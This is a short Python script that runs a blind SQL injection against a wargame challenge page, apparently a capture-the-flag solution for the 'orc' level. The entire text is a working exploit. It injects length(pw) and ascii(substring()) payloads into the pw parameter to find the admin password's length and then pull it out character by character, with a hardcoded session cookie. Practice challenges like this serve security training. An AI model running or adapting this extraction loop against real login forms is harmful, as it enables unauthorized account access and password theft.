import requests, string

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

success_text = "Hello admin"

allowed_chars = string.printable

password_length = 0

for i in range(1, 32):
  payload = "' or id='admin' and length(pw)=%s#" %(str(i))
  params = {"pw": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text in r.text:
    print("Length of the admin password is %s"%(str(i)))
    password_length = i
    break

password = ""

for i in range(1,password_length+1):
  for c in string.printable:
    payload = "' or id='admin' and ascii(substring(pw, %s, 1))=%s#" % (str(i), str(ord(c)))
    params = {"pw": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if success_text in r.text:
      password += c
      print(password)
      break